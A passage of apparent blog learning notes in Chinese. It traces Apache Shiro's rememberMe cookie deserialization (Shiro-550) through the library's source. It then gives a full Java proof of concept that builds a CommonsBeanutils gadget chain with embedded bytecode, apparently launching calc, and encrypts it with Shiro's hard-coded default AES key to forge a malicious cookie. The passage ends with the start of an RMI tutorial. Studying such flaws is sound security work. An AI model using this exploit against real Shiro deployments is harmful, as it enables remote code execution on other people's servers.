<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="built_in">this</span>.serialize(principals);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = <span class="built_in">this</span>.encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进serialize到最后<br>发现org.apache.shiro.io.Serializer，定义了序列化和反序列化操作的两个⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializer</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialize(T var1) <span class="keyword">throws</span> SerializationException;</span><br><span class="line"></span><br><span class="line">    T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] var1)</span> <span class="keyword">throws</span> SerializationException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个接⼝的实现类DefaultSerializer重写了这两个⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">            oos.writeObject(o);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var6) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to serialize object [&quot;</span> + o + <span class="string">&quot;].  &quot;</span> + <span class="string">&quot;In order for the DefaultSerializer to serialize this object, the [&quot;</span> + o.getClass().getName() + <span class="string">&quot;] &quot;</span> + <span class="string">&quot;class must implement java.io.Serializable.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">            <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            <span class="keyword">return</span> deserialized;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分别对应着序列化和反序列化操作</p>
<p>再回到convertPrincipalsToBytes⽅法，当getCipherService⽅法的返回结果不为null，会对bytes进⾏encrypt加密操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">      bytes = <span class="built_in">this</span>.encrypt(bytes);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>而这里CipherService默认就有了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br></pre></td></tr></table></figure>

<p>所以跟进encrypt</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] encrypt(<span class="type">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="type">byte</span>[] value = serialized;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="built_in">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(serialized, <span class="built_in">this</span>.getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现这里会将value进行aes加密,密钥就是默认那个</p>
<p>继续跟进发现调用了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">rememberSerializedIdentity</span><span class="params">(Subject var1, <span class="type">byte</span>[] var2)</span>;</span><br></pre></td></tr></table></figure>

<p>所以跟进子类的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="type">byte</span>[] serialized)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to set the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subject);</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subject);</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.encodeToString(serialized);</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">template</span> <span class="operator">=</span> <span class="built_in">this</span>.getCookie();</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCookie</span>(template);</span><br><span class="line">        cookie.setValue(base64);</span><br><span class="line">        cookie.saveTo(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现会将序列化的内容base64加密保存在cookie里面</p>
<p>思考</p>
<p>当我们成功在Shiro Web应⽤登陆后，shiro会将当前Subject信息保存到Cookie中。当我们发送⼀个Cookie时，shiro必会作⼀个逆过程，也就是会对Cookie进⾏解密，同时包括反序列化获取Subject的信息。当发送⼀个恶意Cookie时，是否可以导致⼀次恶意的反序列化攻击呢？</p>
<p>验证<strong>Cookie</strong></p>
<p>在了org.apache.shiro.web.mgt.CookieRememberMeManager类下的getRememberedSerializedIdentity⽅法，具体逻辑如</p>
<p>下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line"><span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line"><span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> <span class="built_in">this</span>.getCookie().readValue(request, response);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;deleteMe&quot;</span>.equals(base64)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">    base64 = <span class="built_in">this</span>.ensurePadding(base64);</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decoded;</span><br></pre></td></tr></table></figure>

<p>返回⼀个经过base64解密后的byte，按理来说，现在要进⾏AES解密了于是我寻找了调⽤getRememberedSerializedIdentity⽅法的地⽅在org.apache.shiro.mgt.AbstractRememberMeManager类的的getRememberedPrincipals⽅法中调⽤了这个⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">       <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">byte</span>[] bytes = <span class="built_in">this</span>.getRememberedSerializedIdentity(subjectContext);<span class="comment">//z</span></span><br><span class="line">           <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               principals = <span class="built_in">this</span>.convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (RuntimeException var4) &#123;</span><br><span class="line">           principals = <span class="built_in">this</span>.onRememberedPrincipalFailure(var4, subjectContext);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> principals;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>所以这里byte就是base64解码后序列化的数据</p>
<p>随后会调⽤convertBytesToPrincipals⽅法发现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">          bytes = <span class="built_in">this</span>.decrypt(bytes);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.deserialize(bytes);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>会调用的decrypyt</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="built_in">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, <span class="built_in">this</span>.getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br></pre></td></tr></table></figure>

<p>这样就会aes解密，最后调用return this.deserialize(bytes);反序列化</p>
<h2 id="⽆CC依赖CB攻击Shiro-5500"><a href="#⽆CC依赖CB攻击Shiro-5500" class="headerlink" title="⽆CC依赖CB攻击Shiro 5500"></a>⽆<strong>CC</strong>依赖<strong>CB</strong>攻击<strong>Shiro 550</strong>0</h2><p>虽然缺少了commons-collections依赖，⽽commons-beautils依赖是通过shiro-core⾃动导⼊的。</p>
<p>这让我想起之前分析过的CB调⽤链，对原poc进⾏修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.spring;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cb</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">                <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;impl,<span class="number">1</span>&#125;;</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,queue_array);</span><br><span class="line">        setFieldValue(comparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.println(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和cb链有区别的地方是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(property, ComparableComparator.getInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里 ComparableComparator是cc链的一个类所以初始化不能让他为默认的了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.ComparableComparator;</span><br></pre></td></tr></table></figure>

<p>所以我们用的compare是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER</span><br><span class="line">                                     = <span class="keyword">new</span> <span class="title class_">CaseInsensitiveComparator</span>();</span><br></pre></td></tr></table></figure>

<p>而compare方法需要2个字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(String s1, String s2)</span> </span><br></pre></td></tr></table></figure>

<p>所以之前add也只能是2个字符串了</p>
<p>BeanComparator.compare中，this.property为 baicany 字符串，o1、o2为Integer对象，导致报错</p>
<p>在实例化BeanComparator对象时设置this.property为空，避免在执⾏PropertyUtils.getProperty时出现问题</p>
<p><img src="https://baicany.github.io/images/image-20230824212750928.png" alt="image-20230824212750928"></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>rmi反序列化</title>
    <url>/2023/07/28/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>JAVA本身提供了一种RPC框架 RMI及Java 远程方法调用(Java Remote Method Invocation),可以在不同的Java 虚拟机之间进行对象间的通讯,RMI是基于JRMP协议(Java Remote Message Protocol Java远程消息交换协议)去实现的。</p>
<h4 id="RMI调用逻辑"><a href="#RMI调用逻辑" class="headerlink" title="RMI调用逻辑"></a>RMI调用逻辑</h4><p><img src="https://baicany.github.io/images/4f14ac03-3aa6-4f9b-9eff-acf8551e5efb.png-w331s" alt="img">RMI主要分为三部分</p>
<ul>
<li>RMI Registry注册中心</li>
<li>RMI Client 客户端</li>
<li>RMI Server服务端</li>
</ul>
<h3 id="RMI的实现"><a href="#RMI的实现" class="headerlink" title="RMI的实现"></a>RMI的实现</h3><h4 id="注册中心代码"><a href="#注册中心代码" class="headerlink" title="注册中心代码"></a>注册中心代码</h4><p>创建一个继承java.rmi.Remote的接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloInterface</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建注册中心代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Registry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h4><p>先创建一个继承java.rmi.Remote的接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloInterface</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错。（如果客户端、服务端放一起没关系）</li>
<li>同时需要继承Remote类</li>
<li>接口的方法需要声明java.rmi.RemoteException报错</li>
<li>服务端实现这个远程接口</li>
</ul>
<p>继承UnicastRemoteObject类,实现上面的接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;baicany want &quot;</span> + from + <span class="string">&quot;!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>实现远程接口</li>
<li>继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法）</li>
<li>构造函数需要抛出一个RemoteException错误</li>
<li>实现类中使用的对象必须都可序列化，即都继承java.io.Serializable</li>
<li>注册远程对象</li>
</ul>
<p>写服务端的启动类,用于创建远程对象注册表和注册远程对象</p>
